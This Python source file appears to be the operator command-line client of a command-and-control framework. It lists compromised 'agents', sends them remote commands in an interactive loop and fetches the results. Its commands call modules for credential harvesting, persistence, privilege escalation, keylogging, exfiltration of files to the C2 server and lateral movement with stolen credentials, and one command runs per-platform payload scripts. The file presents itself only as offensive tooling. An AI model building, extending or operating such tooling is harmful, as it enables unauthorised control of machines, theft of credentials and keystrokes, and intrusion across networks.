import typer
import requests
import os
import sys
import subprocess
import json
from typing import Optional
import time

# Add modules directory to sys.path
sys.path.append(os.path.join(os.path.dirname(__file__), 'modules'))

import credential_harvesting
import persistence
import privilege_escalation
import reconnaissance
import exfiltration
import keylogging
import lateral_movement

cli = typer.Typer()

C2_URL = "http://127.0.0.1:8000"

def pretty_print_json(data):
    """Pretty print JSON data."""
    formatted_json = json.dumps(data, indent=4, sort_keys=True)
    typer.echo(formatted_json)

@cli.command("list-agents")
def list_agents_cli():
    """List all registered agents."""
    try:
        response = requests.get(f"{C2_URL}/list_agents")
        response.raise_for_status()  # Raise an error for bad status codes
        agents = response.json().get("agents", [])
        if agents:
            typer.echo("Registered Agents:")
            pretty_print_json(agents)
        else:
            typer.echo("No registered agents found.")
    except requests.RequestException as e:
        typer.echo(f"Failed to list agents: {e}")

@cli.command("send-command")
def send_command(agent_id: str, command: str):
    """Send a command to a specific agent."""
    payload = {
        "AgentID": agent_id,
        "Command": command
    }
    try:
        response = requests.post(f"{C2_URL}/sendcommand", json=payload)
        response.raise_for_status()  # Raise an error for bad status codes
        typer.echo(f"Command sent to agent {agent_id}.")
        time.sleep(30)  # Wait for the agent to process the command
        fetch_result(agent_id)
    except requests.RequestException as e:
        typer.echo(f"Failed to send command: {e}")

@cli.command("generate-payload")
def generate_payload(platform: str):
    """Generate an obfuscated payload for a specific platform."""
    typer.echo(f"Generating payload for {platform}...")

@cli.command("harvest-credentials")
def harvest_credentials():
    credentials = credential_harvesting.harvest_credentials()
    typer.echo("Credentials harvested:")
    for cred in credentials:
        pretty_print_json(cred)

@cli.command("establish-persistence")
def establish_persistence():
    persistence.establish_persistence()
    typer.echo("Persistence established.")

@cli.command("escalate-privileges")
def escalate_privileges():
    privilege_escalation.escalate_privileges()
    typer.echo("Privilege escalation attempted.")

@cli.command("gather-system-info")
def gather_system_info():
    system_info = reconnaissance.gather_system_info()
    typer.echo("System Information:")
    pretty_print_json(system_info)

@cli.command("exfiltrate-data")
def exfiltrate_data(file_path: str):
    status_code = exfiltration.exfiltrate_data(file_path, C2_URL)
    typer.echo(f"Data exfiltration status: {status_code}")

@cli.command("start-keylogger")
def start_keylogger(log_file_path: str):
    """Start a keylogger and save logs to the specified file."""
    keylogging.start_keylogger(log_file_path)
    typer.echo(f"Keylogger started, logging to {log_file_path}")

@cli.command("move-laterally")
def move_laterally(target_ip: str, username: str, password: str):
    """Attempt lateral movement to the target IP using the provided credentials."""
    lateral_movement.move_laterally(target_ip, username, password)
    typer.echo(f"Attempted lateral movement to {target_ip}")

@cli.command("deploy-payload")
def deploy_payload(agent_type: str):
    project_root = os.path.dirname(os.path.abspath(__file__))
    payload_dir = os.path.join(project_root, "../payloads")
    
    if agent_type == "macos":
        # Execute macOS payload
        subprocess.run([os.path.join(payload_dir, "macos_payload.sh")])
    elif agent_type == "linux":
        # Execute Linux payload
        subprocess.run([os.path.join(payload_dir, "linux_payload.sh")])
    elif agent_type == "windows":
        # Execute Windows payload
        subprocess.run(["powershell.exe", os.path.join(payload_dir, "windows_payload.ps1")])
    else:
        typer.echo("Unknown agent type. Please specify 'macos', 'linux', or 'windows'.")

@cli.command("select-agent")
def select_agent(agent: Optional[str] = typer.Argument(None, help="The ID of the agent")):
    if agent is None:
        response = requests.get(f"{C2_URL}/list_agents")
        agents = response.json().get("agents", [])
        agent_ids = [agent['AgentID'] for agent in agents]
        if not agent_ids:
            typer.echo("No agents available.")
            return

        agent_id = typer.prompt("Select an agent", type=typer.Choice(agent_ids))
    else:
        agent_id = agent

    while True:
        command = typer.prompt(f"Enter command to send to agent {agent_id} (or 'exit' to stop)")
        if command.lower() == "exit":
            break
        response = requests.post(f"{C2_URL}/sendcommand", json={"AgentID": agent_id, "Command": command})
        response.raise_for_status()  # Raise an error for bad status codes
        typer.echo(f"Command '{command}' sent to agent {agent_id}")

        # Fetch the result of the command
        time.sleep(30)  # Wait for the agent to process the command
        fetch_result(agent_id)

def fetch_result(agent_id: str):
    """Fetch the result of a command from the agent."""
    try:
        response = requests.get(f"{C2_URL}/result", params={"agent_id": agent_id})
        response.raise_for_status()  # Raise an error for bad status codes
        result = response.json().get("Result", "No result available")
        typer.echo(f"Result from agent {agent_id}:")
        pretty_print_json(result)
    except requests.RequestException as e:
        typer.echo(f"Failed to fetch result: {e}")

@cli.command("generate-report")
def generate_report():
    with open('c2_server.log', 'r') as log_file, open('report.txt', 'w') as report_file:
        report_file.write(log_file.read())
    typer.echo("Report generated as report.txt")

if __name__ == "__main__":
    cli()
